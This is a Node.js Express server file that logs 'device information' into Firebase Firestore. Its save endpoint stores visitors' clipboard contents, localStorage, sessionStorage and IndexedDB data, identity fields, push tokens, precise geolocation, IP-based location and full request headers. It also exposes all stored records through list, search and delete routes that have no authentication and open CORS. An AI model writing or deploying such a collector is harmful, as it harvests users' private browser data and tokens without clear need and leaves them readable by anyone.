const express = require('express');
const admin = require('firebase-admin');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;
// If behind a proxy (nginx, cloud), trust X-Forwarded-* headers so we can capture client IP
app.set('trust proxy', true);

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Serve React build files
app.use(express.static(path.join(__dirname, 'dist')));
// Fallback to static files in public folder during development
app.use(express.static(path.join(__dirname, 'public')));

// Initialize Firebase Admin SDK
const serviceAccount = {
    type: process.env.FIREBASE_TYPE || "service_account",
    project_id: process.env.FIREBASE_PROJECT_ID,
    private_key_id: process.env.FIREBASE_PRIVATE_KEY_ID,
    private_key: process.env.FIREBASE_PRIVATE_KEY ? process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n') : undefined,
    client_email: process.env.FIREBASE_CLIENT_EMAIL,
    client_id: process.env.FIREBASE_CLIENT_ID,
    auth_uri: process.env.FIREBASE_AUTH_URI || "https://accounts.google.com/o/oauth2/auth",
    token_uri: process.env.FIREBASE_TOKEN_URI || "https://oauth2.googleapis.com/token",
    auth_provider_x509_cert_url: process.env.FIREBASE_AUTH_PROVIDER_X509_CERT_URL || "https://www.googleapis.com/oauth2/v1/certs",
    client_x509_cert_url: process.env.FIREBASE_CLIENT_X509_CERT_URL
};

try {
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
    });
    console.log('Firebase connected successfully');
} catch (error) {
    console.error('Error initializing Firebase:', error);
}

const db = admin.firestore();

// Helper: perform IP -> geo lookup using a public service (best-effort)
async function lookupIpGeo(ip) {
    try {
        // prefer global fetch (Node 18+). If not available, skip lookup.
        if (typeof fetch !== 'function') return null;
        // ipapi.co returns JSON for the IP
        const cleaned = String(ip).split(',')[0].trim().replace(/::ffff:/, '');
        const res = await fetch(`https://ipapi.co/${encodeURIComponent(cleaned)}/json/` , { timeout: 3000 });
        if (!res.ok) return null;
        const j = await res.json();
        // keep a small set of useful fields
        return {
            ip: cleaned,
            country: j.country_name || j.country || null,
            region: j.region || null,
            city: j.city || null,
            latitude: j.latitude || j.lat || null,
            longitude: j.longitude || j.lon || null,
            org: j.org || j.organization || null
        };
    } catch (e) {
        console.warn('IP geo lookup failed', e && e.message ? e.message : e);
        return null;
    }
}

// Save device information to Firestore
app.post('/api/devices/save', async (req, res) => {
    try {
        // Accept rich device info from client
        const body = req.body || {};

    // Determine client IP (behind proxies may set x-forwarded-for)
    const rawIp = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket?.remoteAddress || req.connection?.remoteAddress || req.ip || '';
    // x-forwarded-for may contain a list of IPs
    const ip = String(rawIp).split(',')[0].trim();

        // Attempt to enrich with server-side IP geolocation (best-effort)
        const geo = await lookupIpGeo(ip);

        const deviceData = {
            // fields from client
            deviceName: body.deviceName || null,
            osName: body.osName || null,
            browserName: body.browserName || null,
            screenResolution: body.screenResolution || null,
            platform: body.platform || null,
            userAgent: body.userAgent || null,
            // additional client-provided fields
            timezone: body.timezone || null,
            languages: body.languages || null,
            connection: body.connection || null,
            battery: body.battery || null,
            hardwareConcurrency: body.hardwareConcurrency || null,
            deviceMemory: body.deviceMemory || null,
            maxTouchPoints: body.maxTouchPoints || null,
            cookieEnabled: body.cookieEnabled || null,
            doNotTrack: body.doNotTrack || null,
            geolocation: body.geolocation || null,
            consent: body.consent || body.consentState || body.consent_geolocation || null,
            extraHeaders: body.extraHeaders || null,
            // New comprehensive fields
            publicIP: body.publicIP || null,
            ipGeolocation: body.ipGeolocation || null,
            userIdentity: body.userIdentity || null,
            mediaAccess: body.mediaAccess || null,
            clipboardContent: body.clipboardContent || null,
            pushNotificationGranted: body.pushNotificationGranted || null,
            pushNotificationToken: body.pushNotificationToken || null,
            pwaInfo: body.pwaInfo || null,
            bluetoothAccess: body.bluetoothAccess || null,
            usbAccess: body.usbAccess || null,
            localStorageData: body.localStorageData || null,
            sessionStorageData: body.sessionStorageData || null,
            indexedDBData: body.indexedDBData || null,
            // server-captured fields
            clientIp: ip,
            requestHeaders: req.headers,
            ipGeo: geo,
            timestamp: body.timestamp || new Date().toISOString(),
            // preserve raw body for debugging (avoid logging sensitive fields like passwords)
            bodyRaw: body,
            createdAt: admin.firestore.FieldValue.serverTimestamp()
        };

        const docRef = await db.collection('devices').add(deviceData);

        res.json({ 
            success: true, 
            message: 'Device saved successfully',
            id: docRef.id
        });
    } catch (error) {
        console.error('Error saving device:', error);
        res.status(500).json({ error: 'Failed to save device', details: error.message });
    }
});

// Get all devices
app.get('/api/devices', async (req, res) => {
    try {
        const snapshot = await db.collection('devices').orderBy('createdAt', 'desc').get();
        const devices = [];
        
        snapshot.forEach(doc => {
            devices.push({
                id: doc.id,
                ...doc.data()
            });
        });

        res.json(devices);
    } catch (error) {
        console.error('Error retrieving devices:', error);
        res.status(500).json({ error: 'Failed to retrieve devices', details: error.message });
    }
});

// Get device count
app.get('/api/devices/count', async (req, res) => {
    try {
        const snapshot = await db.collection('devices').get();
        res.json({ count: snapshot.size });
    } catch (error) {
        console.error('Error counting devices:', error);
        res.status(500).json({ error: 'Failed to count devices', details: error.message });
    }
});

// Get devices by name
app.get('/api/devices/search/:name', async (req, res) => {
    try {
        const name = req.params.name.toLowerCase();
        const snapshot = await db.collection('devices').orderBy('createdAt', 'desc').get();
        const devices = [];

        snapshot.forEach(doc => {
            const device = doc.data();
            if (device.deviceName.toLowerCase().includes(name)) {
                devices.push({
                    id: doc.id,
                    ...device
                });
            }
        });

        res.json(devices);
    } catch (error) {
        console.error('Error searching devices:', error);
        res.status(500).json({ error: 'Failed to search devices', details: error.message });
    }
});

// Delete device by ID
app.delete('/api/devices/:id', async (req, res) => {
    try {
        const id = req.params.id;
        await db.collection('devices').doc(id).delete();

        res.json({
            success: true,
            message: 'Device deleted successfully'
        });
    } catch (error) {
        console.error('Error deleting device:', error);
        res.status(500).json({ error: 'Failed to delete device', details: error.message });
    }
});

// Save user identity data
app.post('/api/user-identity/save', async (req, res) => {
    try {
        const body = req.body || {};
        const userData = {
            name: body.name || null,
            email: body.email || null,
            phone: body.phone || null,
            passwordHash: body.passwordHash || null, // Ensure this is hashed on client side
            profileImage: body.profileImage || null,
            role: body.role || null,
            signUpDate: body.signUpDate || new Date().toISOString(),
            lastLogin: body.lastLogin || new Date().toISOString(),
            socialAccounts: body.socialAccounts || {},
            preferredLanguage: body.preferredLanguage || null,
            theme: body.theme || null,
            createdAt: admin.firestore.FieldValue.serverTimestamp()
        };

        const docRef = await db.collection('userIdentities').add(userData);

        res.json({
            success: true,
            message: 'User identity saved successfully',
            id: docRef.id
        });
    } catch (error) {
        console.error('Error saving user identity:', error);
        res.status(500).json({ error: 'Failed to save user identity', details: error.message });
    }
});

// Serve the main HTML file for React Router
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Internal server error' });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    console.log(`Firebase Firestore Database: vite-1c96c`);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\nClosing Firebase connection...');
    process.exit(0);
});
